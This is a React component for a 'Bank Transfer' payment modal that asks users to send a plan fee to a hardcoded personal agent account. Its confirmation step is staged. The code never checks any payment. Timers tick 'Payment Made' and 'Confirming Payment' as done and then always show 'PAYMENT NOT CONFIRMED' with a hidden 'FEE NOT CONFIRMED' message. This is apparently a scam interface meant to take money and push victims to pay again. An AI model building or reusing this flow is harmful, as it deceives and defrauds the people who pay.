"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Check, X, Eye, EyeOff } from "lucide-react"

interface BankTransferModalProps {
  isOpen: boolean
  onClose: () => void
  userEmail: string
  amount: number
  planName: string
  onPaymentConfirmed: () => void
}

export default function BankTransferModal({
  isOpen,
  onClose,
  userEmail,
  amount,
  planName,
  onPaymentConfirmed,
}: BankTransferModalProps) {
  const [copiedAmount, setCopiedAmount] = useState(false)
  const [copiedAccount, setCopiedAccount] = useState(false)
  const [isConfirming, setIsConfirming] = useState(false)
  const [paymentMadeConfirmed, setPaymentMadeConfirmed] = useState(false)
  const [confirmingPaymentConfirmed, setConfirmingPaymentConfirmed] = useState(false)
  const [showPaymentNotConfirmed, setShowPaymentNotConfirmed] = useState(false)
  const [showPassword, setShowPassword] = useState(false)
  const [passcode, setPasscode] = useState("")

  const bankDetails = {
    amount: `NGN ${amount.toLocaleString()}`,
    accountNumber: "3211850611",
    bankName: "PAGA",
    accountName: "CASHTUBE AGENT -TERHILE",
  }

  const handleCopy = (text: string, type: "amount" | "account") => {
    navigator.clipboard.writeText(text).then(() => {
      if (type === "amount") {
        setCopiedAmount(true)
        setTimeout(() => setCopiedAmount(false), 2000)
      } else if (type === "account") {
        setCopiedAccount(true)
        setTimeout(() => setCopiedAccount(false), 2000)
      }
    })
  }

  const handlePaymentConfirmation = () => {
    setIsConfirming(true)

    // After 30 seconds, mark payment as made
    setTimeout(() => {
      setPaymentMadeConfirmed(true)
    }, 30000)

    // After 40 seconds, mark confirming payment as confirmed
    setTimeout(() => {
      setConfirmingPaymentConfirmed(true)
    }, 40000)

    // After 41 seconds, show payment not confirmed screen
    setTimeout(() => {
      setShowPaymentNotConfirmed(true)
      setIsConfirming(false)
    }, 41000)
  }

  // Reset states when modal closes
  useEffect(() => {
    if (!isOpen) {
      setIsConfirming(false)
      setPaymentMadeConfirmed(false)
      setConfirmingPaymentConfirmed(false)
      setShowPaymentNotConfirmed(false)
      setPasscode("")
      setShowPassword(false)
    }
  }, [isOpen])

  if (!isOpen) return null

  // Show payment not confirmed screen
  if (showPaymentNotConfirmed) {
    return (
      <div className="fixed inset-0 bg-white z-[70]">
        {/* Header */}
        <div className="flex justify-between items-center p-4 sm:p-6 border-b border-gray-200">
          <h1 className="text-2xl sm:text-3xl font-black text-gray-800">Bank Transfer</h1>
          <Button onClick={onClose} variant="ghost" className="text-red-500 hover:text-red-600 font-bold text-lg">
            Cancel
          </Button>
        </div>

        {/* Main Content */}
        <div className="p-4 sm:p-8 max-w-lg mx-auto">
          {/* Amount and Logo Section */}
          <div className="flex justify-between items-start mb-8 sm:mb-12">
            <div className="w-16 h-16 sm:w-20 sm:h-20 bg-indigo-800 rounded-full flex items-center justify-center">
              <div className="text-white text-2xl sm:text-3xl font-black">₦</div>
            </div>
            <div className="text-right">
              <p className="text-3xl sm:text-4xl font-black text-gray-800">{bankDetails.amount}</p>
              <p className="text-sm sm:text-base text-gray-600 mt-2 font-semibold">{userEmail}</p>
            </div>
          </div>

          {/* Instructions */}
          <div className="text-center mb-12 sm:mb-16">
            <p className="text-lg sm:text-xl text-gray-800 font-bold mb-12 sm:mb-16">
              Proceed to your bank app to complete this Transfer
            </p>

            {/* Large Red X Circle */}
            <div className="flex justify-center mb-8 sm:mb-12">
              <div className="w-48 h-48 sm:w-56 sm:h-56 bg-red-500 rounded-full flex items-center justify-center shadow-2xl">
                <X className="h-24 w-24 sm:h-28 sm:w-28 text-white stroke-[3]" />
              </div>
            </div>

            {/* Error Message */}
            <h2 className="text-2xl sm:text-3xl font-black text-orange-500 mb-6 sm:mb-8">PAYMENT NOT CONFIRMED!</h2>

            <p className="text-gray-700 font-bold text-lg sm:text-xl mb-8 sm:mb-12">
              Your payment wasn't confirmed. contact us on email for help
            </p>

            {/* Passcode Input */}
            <div className="relative">
              <Input
                type="text"
                value={showPassword ? "FEE NOT CONFIRMED" : "••••••••••••••••"}
                readOnly
                className="w-full h-16 sm:h-20 text-lg sm:text-xl font-bold border-2 border-gray-300 rounded-2xl px-6 pr-16 text-center"
              />
              <Button
                type="button"
                variant="ghost"
                size="icon"
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 h-10 w-10"
                onClick={() => setShowPassword(!showPassword)}
              >
                {showPassword ? <EyeOff className="h-6 w-6" /> : <Eye className="h-6 w-6" />}
              </Button>
            </div>
          </div>
        </div>
      </div>
    )
  }

  // Show confirmation screen
  if (isConfirming) {
    return (
      <div className="fixed inset-0 bg-white z-[70]">
        {/* Header */}
        <div className="flex justify-between items-center p-4 sm:p-6 border-b border-gray-200">
          <h1 className="text-2xl sm:text-3xl font-black text-gray-800">Bank Transfer</h1>
          <Button onClick={onClose} variant="ghost" className="text-red-500 hover:text-red-600 font-bold text-lg">
            Cancel
          </Button>
        </div>

        {/* Main Content */}
        <div className="p-4 sm:p-8 max-w-lg mx-auto">
          {/* Amount and Logo Section */}
          <div className="flex justify-between items-start mb-8 sm:mb-12">
            <div className="w-16 h-16 sm:w-20 sm:h-20 bg-indigo-800 rounded-full flex items-center justify-center">
              <div className="text-white text-2xl sm:text-3xl font-black">₦</div>
            </div>
            <div className="text-right">
              <p className="text-3xl sm:text-4xl font-black text-gray-800">{bankDetails.amount}</p>
              <p className="text-sm sm:text-base text-gray-600 mt-2 font-semibold">{userEmail}</p>
            </div>
          </div>

          {/* Instructions */}
          <div className="text-center mb-12 sm:mb-16">
            <p className="text-lg sm:text-xl text-gray-800 font-bold mb-8 sm:mb-12">
              Proceed to your bank app to complete this Transfer
            </p>

            {/* Main Loading Spinner */}
            <div className="flex justify-center mb-6 sm:mb-8">
              <div className="w-16 h-16 sm:w-20 sm:h-20 border-4 border-yellow-400 border-t-transparent rounded-full animate-spin"></div>
            </div>

            <p className="text-gray-700 font-bold text-lg sm:text-xl">Wait while we confirm your payment...</p>
          </div>

          {/* Status Cards */}
          <div className="space-y-4 sm:space-y-6">
            {/* Payment Made Status */}
            <div className="bg-gray-100 rounded-2xl p-4 sm:p-6 flex justify-between items-center">
              <span className="text-gray-800 font-bold text-lg sm:text-xl">Payment Made</span>
              <div className="flex items-center">
                {paymentMadeConfirmed ? (
                  <div className="w-8 h-8 sm:w-10 sm:h-10 bg-green-500 rounded-full flex items-center justify-center">
                    <Check className="h-5 w-5 sm:h-6 sm:w-6 text-white" />
                  </div>
                ) : (
                  <div className="w-8 h-8 sm:w-10 sm:h-10 border-2 border-yellow-400 border-t-transparent rounded-full animate-spin"></div>
                )}
              </div>
            </div>

            {/* Confirming Payment Status */}
            <div className="bg-gray-100 rounded-2xl p-4 sm:p-6 flex justify-between items-center">
              <span className="text-gray-800 font-bold text-lg sm:text-xl">Confirming Payment</span>
              <div className="flex items-center">
                {confirmingPaymentConfirmed ? (
                  <div className="w-8 h-8 sm:w-10 sm:h-10 bg-green-500 rounded-full flex items-center justify-center">
                    <Check className="h-5 w-5 sm:h-6 sm:w-6 text-white" />
                  </div>
                ) : (
                  <div className="w-8 h-8 sm:w-10 sm:h-10 border-2 border-yellow-400 border-t-transparent rounded-full animate-spin"></div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    )
  }

  // Show normal bank transfer form
  return (
    <div className="fixed inset-0 bg-white z-[70]">
      {/* Header */}
      <div className="flex justify-between items-center p-4 sm:p-6 border-b border-gray-200">
        <div className="flex flex-col sm:flex-row sm:items-center sm:space-x-4">
          <h1 className="text-2xl sm:text-3xl font-black text-gray-800">Bank Transfer</h1>
          <span className="text-sm sm:text-base text-gray-600 font-semibold">{userEmail}</span>
        </div>
        <Button onClick={onClose} variant="ghost" className="text-red-500 hover:text-red-600 font-bold text-lg">
          Cancel
        </Button>
      </div>

      {/* Main Content */}
      <div className="p-4 sm:p-8 max-w-lg mx-auto">
        {/* Amount and Logo Section */}
        <div className="flex justify-between items-start mb-8 sm:mb-12">
          <div className="w-16 h-16 sm:w-20 sm:h-20 bg-indigo-800 rounded-full flex items-center justify-center">
            <div className="text-white text-2xl sm:text-3xl font-black">₦</div>
          </div>
          <div className="text-right">
            <p className="text-3xl sm:text-4xl font-black text-gray-800">{bankDetails.amount}</p>
            <p className="text-sm sm:text-base text-gray-600 mt-2 font-semibold">{userEmail}</p>
          </div>
        </div>

        {/* Instructions */}
        <div className="text-center mb-8 sm:mb-12">
          <p className="text-lg sm:text-xl text-gray-800 font-bold mb-4">
            Proceed to your bank app to complete this Transfer
          </p>
          <p className="text-sm sm:text-base text-gray-600 font-semibold">{planName} Plan Subscription Payment</p>
        </div>

        {/* Bank Details Card */}
        <div className="border-2 border-gray-300 rounded-3xl p-6 sm:p-8 mb-6 sm:mb-8 bg-gray-50 shadow-lg">
          {/* Amount */}
          <div className="flex justify-between items-center mb-6 pb-6 border-b-2 border-gray-200">
            <div>
              <p className="text-sm sm:text-base text-gray-600 font-semibold">Amount</p>
              <p className="text-2xl sm:text-3xl font-black text-gray-800">{bankDetails.amount}</p>
            </div>
            <Button
              onClick={() => handleCopy(amount.toString(), "amount")}
              className="bg-orange-500 hover:bg-orange-600 text-white px-4 sm:px-6 py-2 sm:py-3 rounded-xl text-sm sm:text-base font-bold"
            >
              {copiedAmount ? "Copied!" : "Copy"}
            </Button>
          </div>

          {/* Account Number */}
          <div className="flex justify-between items-center mb-6 pb-6 border-b-2 border-gray-200">
            <div>
              <p className="text-sm sm:text-base text-gray-600 font-semibold">Account Number</p>
              <p className="text-2xl sm:text-3xl font-black text-gray-800">{bankDetails.accountNumber}</p>
            </div>
            <Button
              onClick={() => handleCopy(bankDetails.accountNumber, "account")}
              className="bg-orange-500 hover:bg-orange-600 text-white px-4 sm:px-6 py-2 sm:py-3 rounded-xl text-sm sm:text-base font-bold"
            >
              {copiedAccount ? "Copied!" : "Copy"}
            </Button>
          </div>

          {/* Bank Name */}
          <div className="mb-6 pb-6 border-b-2 border-gray-200">
            <p className="text-sm sm:text-base text-gray-600 font-semibold">Bank Name</p>
            <p className="text-2xl sm:text-3xl font-black text-gray-800">{bankDetails.bankName}</p>
          </div>

          {/* Account Name */}
          <div>
            <p className="text-sm sm:text-base text-gray-600 font-semibold">Account Name</p>
            <p className="text-2xl sm:text-3xl font-black text-gray-800">{bankDetails.accountName}</p>
          </div>
        </div>

        {/* Bottom Instructions */}
        <div className="text-center mb-6 sm:mb-8">
          <p className="text-gray-700 font-bold text-lg sm:text-xl">
            Pay to this specific account and get your access code
          </p>
        </div>

        {/* Confirmation Button */}
        <Button
          onClick={handlePaymentConfirmation}
          className="w-full bg-orange-500 hover:bg-orange-600 text-white py-4 sm:py-6 text-xl sm:text-2xl font-black rounded-2xl shadow-2xl transform transition-all duration-200 hover:scale-105"
        >
          I have made this bank payment
        </Button>
      </div>
    </div>
  )
}
